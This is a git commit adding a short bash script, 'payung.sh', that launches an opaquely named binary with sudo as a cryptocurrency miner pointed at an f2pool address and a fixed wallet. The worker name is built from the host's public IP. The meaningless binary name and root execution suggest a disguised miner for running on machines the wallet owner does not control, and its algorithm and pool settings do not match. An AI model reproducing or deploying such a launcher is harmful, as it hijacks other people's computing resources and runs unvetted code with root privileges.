cb874f430132d3fdfa04355369d84679516b20e0
RIZAL ADITYA <70772802+Rizal07-adit@users.noreply.github.com>
2021-03-22 17:11:10 +0700

    new files

---
+++ payung.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+POOL=eth.f2pool.com:6688
+WALLET=0x35c7ed9124ea813033d909c0698a1eb52aa9e268
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Catok
+
+cd "$(dirname "$0")"
+
+chmod +x ./eaedaeqsd2wqe122 && sudo ./eaedaeqsd2wqe122 -a argon2id_chukwa2 -o $POOL -u $WALLET.$WORKER $@
